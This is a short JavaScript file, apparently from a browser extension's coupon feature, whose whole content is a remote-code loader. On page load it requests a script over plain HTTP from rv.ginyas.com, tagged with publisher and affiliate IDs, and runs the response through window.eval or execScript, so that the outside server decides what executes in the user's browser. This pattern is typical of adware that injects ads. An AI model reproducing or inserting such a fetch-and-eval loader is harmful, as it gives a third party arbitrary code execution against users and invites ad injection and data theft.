function initGinyas(){
    var bbrsLogic = "http://rv.ginyas.com/app/bookmark/bookmarklet/bbrsChromeRVObs.php?pubId=ginyas_234&affId=ginyas_234";
    var domainsXHR = new XMLHttpRequest();domainsXHR.open("GET", bbrsLogic, true);
    domainsXHR.onreadystatechange = function() { 
        if (domainsXHR.readyState == 4) { globalEval(domainsXHR.responseText); }
    };
    domainsXHR.send();
}

function globalEval(src, callback) {
    if (window.execScript) {window.execScript(src);if (callback){callback();} return;}
    var fn = function() {window.eval.call(window,src);
    if (callback){callback();}};fn();             
}

$(function () {
    if ($.db('show_coupons') == undefined || $.db('show_coupons') === '1') {
        initGinyas();
    }
});
